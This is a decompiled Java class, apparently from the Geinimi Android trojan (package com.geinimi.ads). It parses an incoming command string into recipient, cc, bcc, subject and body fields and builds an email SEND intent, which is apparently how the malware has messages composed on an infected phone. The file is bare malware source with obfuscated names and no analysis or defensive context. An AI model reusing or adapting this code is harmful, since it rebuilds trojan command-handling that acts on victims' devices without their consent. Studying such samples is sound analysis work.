package com.geinimi.ads;

import android.content.Intent;
import com.geinimi.C0000r;
import java.net.URLDecoder;

public final class h extends Advertisable {
    private String[] b = {"to_address", "cc_address", "bcc_address", "email_title", "email_content"};

    protected h(String str) {
        super(str);
    }

    public final boolean b() {
        return true;
    }

    public final void c() {
        try {
            String substring = this.a.substring(C0000r.h.length());
            int indexOf = substring.indexOf("{");
            int indexOf2 = substring.indexOf("}");
            String substring2 = substring.substring(indexOf + 1, indexOf2);
            String[] split = substring2.split(";");
            if (split == null) {
                a("to_address", substring2);
            } else {
                for (int i = 0; i < split.length; i++) {
                    if (i == 0) {
                        a("to_address", split[i]);
                    } else if (i == 1) {
                        a("cc_address", split[i]);
                    } else if (i == 2) {
                        a("bcc_address", split[i]);
                    }
                }
            }
            int indexOf3 = substring.indexOf("{", indexOf2);
            int indexOf4 = substring.indexOf("}", indexOf3);
            a("email_title", URLDecoder.decode(substring.substring(indexOf3 + 1, indexOf4), "UTF-8"));
            int indexOf5 = substring.indexOf("{", indexOf4);
            a("email_content", URLDecoder.decode(substring.substring(indexOf5 + 1, substring.indexOf("}", indexOf5)), "UTF-8"));
        } catch (Exception e) {
        }
    }

    public final int d() {
        return 17301659;
    }

    public final int e() {
        return 17301545;
    }

    public final Intent f() {
        Intent intent = new Intent("android.intent.action.SEND");
        if (a((String) "to_address") != null) {
            intent.putExtra("android.intent.extra.EMAIL", new String[]{a((String) "to_address")});
            if (a((String) "cc_address") != null) {
                intent.putExtra("android.intent.extra.CC", new String[]{a((String) "cc_address")});
            }
            if (a((String) "bcc_address") != null) {
                intent.putExtra("android.intent.extra.BCC", new String[]{a((String) "bcc_address")});
            }
            if (a((String) "email_title") != null) {
                intent.putExtra("android.intent.extra.SUBJECT", a((String) "email_title"));
            }
            if (a((String) "email_content") != null) {
                intent.putExtra("android.intent.extra.TEXT", a((String) "email_content"));
            }
            intent.setType("message/rfc822");
        }
        return intent;
    }

    /* access modifiers changed from: protected */
    public final String[] h() {
        return this.b;
    }
}
